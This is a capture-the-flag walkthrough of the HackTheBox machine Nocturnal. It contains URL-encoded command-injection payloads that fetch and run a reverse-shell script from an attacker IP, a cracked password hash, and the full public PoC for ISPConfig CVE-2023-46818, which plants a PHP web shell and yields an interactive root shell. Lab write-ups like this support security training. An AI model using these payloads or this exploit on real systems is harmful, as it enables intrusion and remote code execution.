# HackTheBox \[Nocturnal] [10.10.11.64]

**Type:** Comprehensive Penetration Test Walkthrough

## Overview

Engaged in a thorough penetration test on [HackTheBox](https://hackthebox.com) machine **[Nocturnal](https://app.hackthebox.com/machines/Nocturnal)**.
---

## 1️⃣ Get Shell

### Port Scanning

Scan top 1000 ports to discover open services:

```bash
nmap -Pn -sT 10.10.11.64 --top-ports 1000
```

Ports 22 (SSH) and 80 (HTTP) are open.

### Domain Discovery

The HTTP service requires a domain, `nocturnal.htb`. Update `/etc/hosts` accordingly.

### Initial Enumeration

* The website allows **file uploads** but restricts extensions to:

  * pdf, doc, docx, xls, xlsx, odt.
* Upload a PDF to test functionality.
* Uploaded files appear in:

```
http://nocturnal.htb/view.php?username=<user>&file=<file>
```

### Username Enumeration

The file viewer lacks authentication, enabling **username brute-forcing** using Burp Suite and a dictionary.

Discovered user:

```
amanda
```

### Looting Credentials

Found `privacy.odt` containing **initial password** for `amanda`.

Logged in as `amanda` and accessed the **admin panel**, retrieving PHP source for auditing.

### Source Audit: Command Injection

Found **zip backup function** using user-controlled `password`:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) return false;
    }
    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

Command executed:

```php
zip -x './backups/*' -r -P $password $backupFile . > $logFile 2>&1 &
```

### Bypassing Blacklist

Using URL encoding:

* `%0a` for newline
* `%09` for space

Payloads:

```bash
# Download reverse shell
password=%0abash%09-c%09"wget%09http://10.10.16.78:8089/1.sh"&backup=

# Execute reverse shell
password=%0abash%09-c%09"bash%091.sh"&backup=
```

### Getting Shell

* Received **reverse shell as `www-data`**.
* Found `nocturnal_database.db` with SQLite containing user hashes:

```
tobias: 55c82b1ccd55ab219b3b109b07d5061d
```

### Cracking Hash

Used `john` with `rockyou.txt`:

```bash
$john --format=raw-md5 tobias.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
slowmotionapocalypse (?)     
1g 0:00:00:00 DONE (2025-07-08 12:22) 2.222g/s 8207Kp/s 8207Kc/s 8207KC/s slp31891..slowmo6
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

Recovered **password**, logged in via SSH as `tobias`, and captured **user flag**.

---

## 2️⃣ Privilege Escalation

### Internal Port Discovery

```bash
$ ss -tunlp
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:8080         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:25           0.0.0.0:*            
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:587          0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*  
```

Found **port 8080** open locally.

### Local Port Forwarding

```bash
ssh -L 8787:127.0.0.1:8080 tobias@10.10.11.64 -N
```

### ISPConfig Exploitation

ISPConfig admin panel accessible at `localhost:8787`.

* Brute-forced `admin` credentials using previous password `slowmotionapocalypse`.
* Identified **ISPConfig 3.2.10p1**.
* Found a **PHP Code Injection** PoC for **ISPConfig <= 3.2.11**.

### Exploiting CVE-2023-46818

Used the POC:

```php
<?php

/*
    ------------------------------------------------------------------------
    ISPConfig <= 3.2.11 (language_edit.php) PHP Code Injection Vulnerability
    ------------------------------------------------------------------------
    
    author..............: Egidio Romano aka EgiX
    mail................: n0b0d13s[at]gmail[dot]com
    software link.......: https://www.ispconfig.org
    
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] Vulnerability Description:
      
    User input passed through the "records" POST parameter to /admin/language_edit.php is 
    not properly sanitized before being used to dynamically generate PHP code that will be
    executed by the application. This can be exploited by malicious administrator users to
    inject and execute arbitrary PHP code on the web server.
    
    [-] Original Advisory:

    https://karmainsecurity.com/KIS-2023-13
*/

set_time_limit(0);
error_reporting(E_ERROR);

if (!extension_loaded("curl")) die("[-] cURL extension required!\n");

if ($argc != 4) die("\nUsage: php $argv[0] <URL> <Username> <Password>\n\n");

list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];

print "[+] Logging in with username '{$user}' and password '{$pass}'\n";

@unlink('./cookies.txt');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "{$url}login/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, './cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, './cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".urlencode($user)."&password=".urlencode($pass)."&s_mod=login");

if (preg_match('/Username or Password wrong/i', curl_exec($ch))) die("[-] Login failed!\n");

print "[+] Injecting shell\n";

$__phpcode = base64_encode("<?php print('____'); passthru(base64_decode(\$_SERVER['HTTP_C'])); print('____'); ?>"); 
$injection = "'];file_put_contents('sh.php',base64_decode('{$__phpcode}'));die;#";
$lang_file = str_shuffle("qwertyuioplkjhgfdsazxcvbnm").".lng";

curl_setopt($ch, CURLOPT_URL, "{$url}admin/language_edit.php");
curl_setopt($ch, CURLOPT_POSTFIELDS, "lang=en&module=help&lang_file={$lang_file}");

$res = curl_exec($ch);

if (!preg_match('/_csrf_id" value="([^"]+)"/i', $res, $csrf_id)) die("[-] CSRF ID not found!\n");
if (!preg_match('/_csrf_key" value="([^"]+)"/i', $res, $csrf_key)) die("[-] CSRF key not found!\n");

curl_setopt($ch, CURLOPT_POSTFIELDS, "lang=en&module=help&lang_file={$lang_file}&_csrf_id={$csrf_id[1]}&_csrf_key={$csrf_key[1]}&records[%5C]=".urlencode($injection));

curl_exec($ch);

print "[+] Launching shell\n";

curl_setopt($ch, CURLOPT_URL, "{$url}admin/sh.php");
curl_setopt($ch, CURLOPT_POST, false);

while(1)
{
    print "\nispconfig-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["C: ".base64_encode($cmd)]);
    preg_match('/____(.*)____/s', curl_exec($ch), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}

```

Executed:

```bash
$php CVE-2023-46818.php http://localhost:8787/ admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell#
```

Successfully executed commands as **root**:

```bash
ispconfig-shell# whoami
root
```

Captured **root flag**.
```bash
ispconfig-shell# cat /root/root.txt
21a789c04e236835972a2d72da7ebe4b
```
---

## ✅ Summary

* Enumerated upload functionality with **restricted extensions**.
* Abused **command injection using encoded newlines and tabs**.
* Retrieved user hash, cracked, and logged in via SSH.
* Used **local port forwarding** to access internal ISPConfig panel.
* Exploited **PHP Code Injection (CVE-2023-46818)** to gain **root**.
* Captured both **user** and **root flags**.

---

## 🎯 Key Techniques Learned

* Blacklist bypass using `%0a` (newline) and `%09` (tab).
* SQLite extraction and hash cracking.
* Local port forwarding for internal services.
* Practical exploitation of authenticated RCE vulnerabilities.
* Clean workflow for enumeration → exploitation → privesc.

---

This structured note will help reinforce your **methodology** for future HTB boxes and real-world OSCP prep. Let me know if you need a Markdown-to-PDF export for your archive and review systems.
